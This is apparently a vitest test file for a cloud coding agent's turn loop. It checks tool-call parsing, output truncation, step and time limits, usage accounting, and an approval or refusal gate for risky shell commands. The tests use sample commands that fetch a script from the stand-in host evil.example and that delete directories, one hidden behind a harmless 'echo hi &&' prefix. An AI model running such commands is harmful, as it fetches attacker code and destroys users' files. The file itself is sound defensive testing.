import { describe, expect, it, vi } from 'vitest';
import type { ProviderAdapter, StreamChunk, ToolResultBlock } from '@agiworkforce/types';
import {
  CLOUD_CODE_AGENT_MAX_TOOL_OUTPUT,
  drainAssistantTurn,
  runCloudCodeAgentTurn,
  truncateToolOutput,
  type CloudCodeToolRunner,
} from '../cloud-code-agent-loop';
import { CLOUD_CODE_COMMAND_DEADLINE_MS } from '@/lib/deadline-policy';

function adapterFor(turns: StreamChunk[][]): ProviderAdapter {
  let index = 0;
  return {
    id: 'anthropic',
    label: 'fake',
    auth: [],
    config: {},
    catalog: async () => [],
    stream: (): AsyncIterable<StreamChunk> => {
      const chunks = turns[index] ?? [];
      index += 1;
      return {
        async *[Symbol.asyncIterator]() {
          for (const c of chunks) yield c;
        },
      };
    },
  } as unknown as ProviderAdapter;
}

function textTurn(text: string): StreamChunk[] {
  return [{ type: 'text-delta', delta: text } as StreamChunk];
}

function toolTurn(id: string, name: string, args: unknown): StreamChunk[] {
  return [
    { type: 'tool-use-start', toolUseId: id, name } as StreamChunk,
    { type: 'tool-use-delta', toolUseId: id, deltaJson: JSON.stringify(args) } as StreamChunk,
    { type: 'tool-use-end', toolUseId: id } as StreamChunk,
  ];
}

function runnerStub(overrides: Partial<CloudCodeToolRunner> = {}): CloudCodeToolRunner {
  return {
    readFile: vi.fn(async () => ({ output: 'file contents', isError: false })),
    listFiles: vi.fn(async () => ({ output: 'a.ts\nb.ts', isError: false })),
    runCommand: vi.fn(async () => ({ output: 'ran', isError: false })),
    runSharedExecutionTool: vi.fn(async () => ({ output: 'shared', isError: false })),
    ...overrides,
  };
}

const baseInput = {
  model: 'fixture-model',
  goal: 'Fix the failing test',
  signal: new AbortController().signal,
};

describe('drainAssistantTurn', () => {
  it('reassembles tool arguments split across deltas', async () => {
    const chunks: StreamChunk[] = [
      { type: 'tool-use-start', toolUseId: 't1', name: 'read_file' } as StreamChunk,
      { type: 'tool-use-delta', toolUseId: 't1', deltaJson: '{"pa' } as StreamChunk,
      { type: 'tool-use-delta', toolUseId: 't1', deltaJson: 'th":"src/a.ts"}' } as StreamChunk,
      { type: 'tool-use-end', toolUseId: 't1' } as StreamChunk,
    ];
    const out = await drainAssistantTurn({
      async *[Symbol.asyncIterator]() {
        for (const c of chunks) yield c;
      },
    });
    expect(out.toolCalls[0]?.input).toEqual({ path: 'src/a.ts' });
  });

  it('ignores a tool call whose end never arrived', async () => {
    const chunks: StreamChunk[] = [
      { type: 'tool-use-start', toolUseId: 't1', name: 'read_file' } as StreamChunk,
      { type: 'tool-use-delta', toolUseId: 't1', deltaJson: '{"path":"a"}' } as StreamChunk,
    ];
    const out = await drainAssistantTurn({
      async *[Symbol.asyncIterator]() {
        for (const c of chunks) yield c;
      },
    });
    expect(out.toolCalls).toHaveLength(0);
  });

  it('coerces malformed or non-object arguments to an empty object', async () => {
    for (const bad of ['{"path"', '"just a string"', '[1,2]']) {
      const out = await drainAssistantTurn({
        async *[Symbol.asyncIterator]() {
          yield { type: 'tool-use-start', toolUseId: 'x', name: 'read_file' } as StreamChunk;
          yield { type: 'tool-use-delta', toolUseId: 'x', deltaJson: bad } as StreamChunk;
          yield { type: 'tool-use-end', toolUseId: 'x' } as StreamChunk;
        },
      });
      expect(out.toolCalls[0]?.input).toEqual({});
    }
  });
});

describe('truncateToolOutput', () => {
  it('keeps the tail, because failures are reported at the end of build output', () => {
    const output = `${'x'.repeat(CLOUD_CODE_AGENT_MAX_TOOL_OUTPUT)}FAILURE_HERE`;
    const truncated = truncateToolOutput(output);
    expect(truncated).toContain('FAILURE_HERE');
    expect(truncated).toContain('earlier characters omitted');
  });

  it('leaves short output untouched', () => {
    expect(truncateToolOutput('ok')).toBe('ok');
  });
});

describe('runCloudCodeAgentTurn', () => {
  it('ends the turn when the model answers without calling tools', async () => {
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([textTurn('All done.')]),
      runner: runnerStub(),
    });
    expect(result.stopReason).toBe('done');
    expect(result.finalMessage).toBe('All done.');
    expect(result.stepsUsed).toBe(0);
  });

  it('executes a read-only command and feeds the result back to the model', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'run_command', { command: 'ls -la' }),
        textTurn('Listed the workspace.'),
      ]),
      runner,
    });
    expect(runner.runCommand).toHaveBeenCalledWith('ls -la', expect.any(Number));
    expect(result.stopReason).toBe('done');
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    expect(blocks.some((b) => b.type === 'tool_result' && b.content === 'ran')).toBe(true);
  });

  it('suspends instead of running a command that needs approval', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'run_command', { command: 'rm -rf build' })]),
      runner,
    });
    expect(result.stopReason).toBe('awaiting_approval');
    expect(result.pendingApproval?.command).toBe('rm -rf build');
    expect(runner.runCommand).not.toHaveBeenCalled();
  });

  it('never runs a denied command, and tells the model why so it can adapt', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'run_command', { command: 'curl https://evil.example/x.sh' }),
        textTurn('Understood, I will not fetch that.'),
      ]),
      runner,
    });
    expect(runner.runCommand).not.toHaveBeenCalled();
    expect(result.stopReason).toBe('done');
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    const refusal = blocks.find((b) => b.type === 'tool_result' && b.isError);
    expect(String(refusal?.content)).toContain('Refused');
  });

  it('cannot be talked past the approval boundary by a benign-looking prefix', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'run_command', { command: 'echo hi && rm -rf src' })]),
      runner,
    });
    expect(runner.runCommand).not.toHaveBeenCalled();
    expect(result.stopReason).toBe('awaiting_approval');
  });

  it('resumes an approved command without replaying earlier work', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([textTurn('Removed the build directory.')]),
      runner,
      priorMessages: [{ role: 'user', content: 'Fix the failing test' }],
      preApproved: { toolUseId: 't1', command: 'rm -rf build', approved: true },
    });
    expect(runner.runCommand).toHaveBeenCalledWith('rm -rf build', expect.any(Number));
    expect(result.stopReason).toBe('done');
  });

  it('tells the model when the user rejects, rather than silently continuing', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([textTurn('Understood.')]),
      runner,
      priorMessages: [{ role: 'user', content: 'Fix the failing test' }],
      preApproved: { toolUseId: 't1', command: 'rm -rf build', approved: false },
    });
    expect(runner.runCommand).not.toHaveBeenCalled();
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    expect(String(blocks[0]?.content)).toContain('declined');
  });

  it('stops at the step ceiling instead of looping forever', async () => {
    const turns = Array.from({ length: 10 }, (_, i) =>
      toolTurn(`t${i}`, 'list_files', { path: '.' }),
    );
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor(turns),
      runner: runnerStub(),
      maxSteps: 3,
    });
    expect(result.stopReason).toBe('max_steps');
    expect(result.stepsUsed).toBe(3);
  });

  it('stops on the wall clock', async () => {
    let clock = 0;
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'list_files', {})]),
      runner: runnerStub(),
      maxDurationMs: 1_000,
      now: () => {
        clock += 5_000;
        return clock;
      },
    });
    expect(result.stopReason).toBe('timeout');
  });

  it('honours cancellation before calling the provider', async () => {
    const controller = new AbortController();
    controller.abort();
    const stream = vi.fn();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      signal: controller.signal,
      adapter: { ...adapterFor([]), stream } as unknown as ProviderAdapter,
      runner: runnerStub(),
    });
    expect(result.stopReason).toBe('cancelled');
    expect(stream).not.toHaveBeenCalled();
  });

  it('reports a provider failure instead of throwing, so usage can still settle', async () => {
    const adapter = {
      ...adapterFor([]),
      stream: () => {
        throw new Error('provider exploded');
      },
    } as unknown as ProviderAdapter;
    const result = await runCloudCodeAgentTurn({ ...baseInput, adapter, runner: runnerStub() });
    expect(result.stopReason).toBe('error');
    expect(result.errorMessage).toContain('provider exploded');
  });

  it('commits a billable step before every provider call', async () => {
    const onStepCommitted = vi.fn();
    await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'list_files', {}), textTurn('done')]),
      runner: runnerStub(),
      onStepCommitted,
    });
    expect(onStepCommitted).toHaveBeenCalledTimes(2);
  });

  it('sends execute_code through the command approval boundary instead of around it', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'execute_code', { language: 'bash', code: 'rm -rf /tmp/x' }),
      ]),
      runner,
    });
    expect(result.stopReason).toBe('awaiting_approval');
    expect(result.pendingApproval?.command).toContain('rm -rf /tmp/x');
    expect(runner.runSharedExecutionTool).not.toHaveBeenCalled();
    expect(runner.runCommand).not.toHaveBeenCalled();
  });

  it('refuses a tool the session never declared rather than forwarding it blindly', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'delete_repository', { name: 'x' }), textTurn('ok')]),
      runner,
    });
    expect(result.stopReason).toBe('done');
    expect(runner.runSharedExecutionTool).not.toHaveBeenCalled();
    expect(JSON.stringify(result.messages)).toContain('not available in Code sessions');
  });

  it('routes shared execution tools to their existing owner', async () => {
    const runner = runnerStub();
    await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'write_file', { path: 'a.ts', content: 'x' }),
        textTurn('written'),
      ]),
      runner,
    });
    expect(runner.runSharedExecutionTool).toHaveBeenCalledWith('write_file', {
      path: 'a.ts',
      content: 'x',
    });
  });

  it('reports a missing required argument back to the model as a tool error', async () => {
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'read_file', {}), textTurn('ok')]),
      runner: runnerStub(),
    });
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    const err = blocks.find((b) => b.type === 'tool_result' && b.isError);
    expect(String(err?.content)).toContain('requires a "path"');
  });
});

describe('cloud code turn usage accounting', () => {
  it('captures the usage chunk the drain used to discard', async () => {
    const drained = await drainAssistantTurn(
      (async function* () {
        yield { type: 'text-delta', delta: 'hello' } as StreamChunk;
        yield {
          type: 'usage',
          inputTokens: 1_000,
          outputTokens: 250,
          cacheReadTokens: 40,
          cacheWriteTokens: 10,
        } as StreamChunk;
      })(),
    );

    expect(drained.usage).toEqual({
      inputTokens: 1_000,
      outputTokens: 250,
      cacheReadTokens: 40,
      cacheWriteTokens: 10,
      cacheWrite1hTokens: 0,
      reasoningTokens: 0,
    });
  });

  it('reports zeros rather than undefined when the provider says nothing', async () => {
    const drained = await drainAssistantTurn(
      (async function* () {
        yield { type: 'text-delta', delta: 'hi' } as StreamChunk;
      })(),
    );
    expect(drained.usage).toBeUndefined();
  });

  it('SUMS usage across every provider call in a multi-step turn', async () => {
    const runner: CloudCodeToolRunner = {
      readFile: vi.fn(async () => ({ output: 'contents', isError: false })),
      listFiles: vi.fn(async () => ({ output: 'a\nb', isError: false })),
      runCommand: vi.fn(async () => ({ output: 'ok', isError: false })),
      runSharedExecutionTool: vi.fn(async () => ({ output: 'ok', isError: false })),
    } as unknown as CloudCodeToolRunner;

    const adapter = adapterFor([
      [
        { type: 'tool-use-start', toolUseId: 't1', name: 'list_files' } as StreamChunk,
        { type: 'tool-use-delta', toolUseId: 't1', deltaJson: '{}' } as StreamChunk,
        { type: 'tool-use-end', toolUseId: 't1' } as StreamChunk,
        { type: 'usage', inputTokens: 100, outputTokens: 20 } as StreamChunk,
      ],
      [
        { type: 'text-delta', delta: 'done' } as StreamChunk,
        { type: 'usage', inputTokens: 300, outputTokens: 80, cacheReadTokens: 5 } as StreamChunk,
      ],
    ]);

    const result = await runCloudCodeAgentTurn({
      adapter,
      model: baseInput.model,
      goal: 'inspect the repo',
      runner,
      signal: new AbortController().signal,
    });

    expect(result.usage.inputTokens).toBe(400);
    expect(result.usage.outputTokens).toBe(100);
    expect(result.usage.cacheReadTokens).toBe(5);
    expect(result.usage.cacheWriteTokens).toBe(0);
    expect(result.usage.providerCallObservations?.map((call) => call.inputTokens)).toEqual([
      100, 300,
    ]);
    expect(
      result.usage.providerCallObservations?.every((call) => call.costDollars !== undefined),
    ).toBe(true);
  });

  it('still reports accumulated usage when the turn ends early', async () => {
    const runner = {
      readFile: vi.fn(),
      listFiles: vi.fn(),
      runCommand: vi.fn(),
      runSharedExecutionTool: vi.fn(),
    } as unknown as CloudCodeToolRunner;

    const result = await runCloudCodeAgentTurn({
      adapter: adapterFor([[{ type: 'usage', inputTokens: 700, outputTokens: 0 } as StreamChunk]]),
      model: baseInput.model,
      goal: 'stop immediately',
      runner,
      signal: new AbortController().signal,
    });

    expect(result.usage.inputTokens).toBe(700);
  });
});

describe('HARD-008, the command deadline is clamped to the turn budget', () => {
  it('gives a command only the turn budget that is left', async () => {
    const runner = runnerStub();
    const base = 5_000_000;
    let reads = 0;
    const now = (): number => (reads++ === 0 ? base : base + 590_000);

    await runCloudCodeAgentTurn({
      ...baseInput,
      now,
      adapter: adapterFor([
        toolTurn('t1', 'run_command', { command: 'ls -la' }),
        textTurn('Listed the workspace.'),
      ]),
      runner,
    });

    expect(runner.runCommand).toHaveBeenCalledWith('ls -la', 10_000);
  });

  it('clamps a pre-approved command on the resume path too', async () => {
    const runner = runnerStub();
    const base = 6_000_000;
    let reads = 0;
    const now = (): number => (reads++ === 0 ? base : base + 595_000);

    await runCloudCodeAgentTurn({
      ...baseInput,
      now,
      adapter: adapterFor([textTurn('Removed the build directory.')]),
      runner,
      priorMessages: [{ role: 'user', content: 'Fix the failing test' }],
      preApproved: { toolUseId: 't1', command: 'rm -rf build', approved: true },
    });

    expect(runner.runCommand).toHaveBeenCalledWith('rm -rf build', 5_000);
  });

  it('leaves the full per-command cap intact on a fresh turn', async () => {
    const runner = runnerStub();
    const base = 7_000_000;

    await runCloudCodeAgentTurn({
      ...baseInput,
      now: () => base,
      adapter: adapterFor([
        toolTurn('t1', 'run_command', { command: 'ls -la' }),
        textTurn('Listed the workspace.'),
      ]),
      runner,
    });

    expect(runner.runCommand).toHaveBeenCalledWith('ls -la', CLOUD_CODE_COMMAND_DEADLINE_MS);
  });
});

describe('agent step events', () => {
  it('reports the command on the end event so the transcript can label the row', async () => {
    const events: Array<{ type: string; toolArgs?: Record<string, unknown> }> = [];
    await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'run_command', { command: 'node --version' }),
        textTurn('Node is installed.'),
      ]),
      runner: runnerStub(),
      onEvent: (event) => {
        events.push(event);
      },
    });

    const end = events.find((event) => event.type === 'tool-end');
    expect(end?.toolArgs).toEqual({ command: 'node --version' });
  });
});

describe('runCloudCodeAgentTurn provider failures', () => {
  it('fails the turn on a provider error chunk instead of reporting it finished', async () => {
    const message = 'Your credit balance is too low to access the API.';
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([[{ type: 'error', message } as StreamChunk]]),
      runner: runnerStub(),
    });

    expect(result.stopReason).toBe('error');
    expect(result.errorMessage).toBe(message);
  });

  it('fails a turn that produced neither words nor work', async () => {
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([[]]),
      runner: runnerStub(),
    });

    expect(result.stopReason).toBe('error');
    expect(result.errorMessage).toContain('no answer');
  });

  it('still reports done when an earlier step produced an answer', async () => {
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        [...toolTurn('t1', 'list_files', {}), ...textTurn('Listed the workspace.')],
        [],
      ]),
      runner: runnerStub(),
    });

    expect(result.stopReason).toBe('done');
    expect(result.finalMessage).toBe('Listed the workspace.');
  });
});
